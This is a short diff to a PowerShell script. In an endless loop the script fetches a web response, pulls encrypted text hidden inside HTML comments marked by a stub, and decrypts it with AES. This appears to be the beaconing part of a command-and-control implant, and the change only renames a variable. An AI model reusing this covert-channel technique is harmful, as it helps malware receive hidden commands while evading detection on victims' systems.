@@ -124,8 +124,8 @@ while ($True) {
         $resp = $r.GetResponse()
         $reqstream = $resp.GetResponseStream()
         $sr = New-Object System.IO.StreamReader $reqstream
-        $ENCRYPTEDSTREAM = $sr.ReadToEnd() -split("`n") | Select-String "<!-- $STUB"
-        $ENCRYPTED = $ENCRYPTEDSTREAM -split("<!-- $STUB")
+        $ENCRYPTEDSTREAMS = $sr.ReadToEnd() -split("`n") | Select-String "<!-- $STUB"
+        $ENCRYPTED = $ENCRYPTEDSTREAMS -split("<!-- $STUB")
         $ENCRYPTED = $ENCRYPTED[1] -split(" --></body>")
         $key = Create-AesKey
         $DECRYPTED = Decrypt-String $key $ENCRYPTED[0]
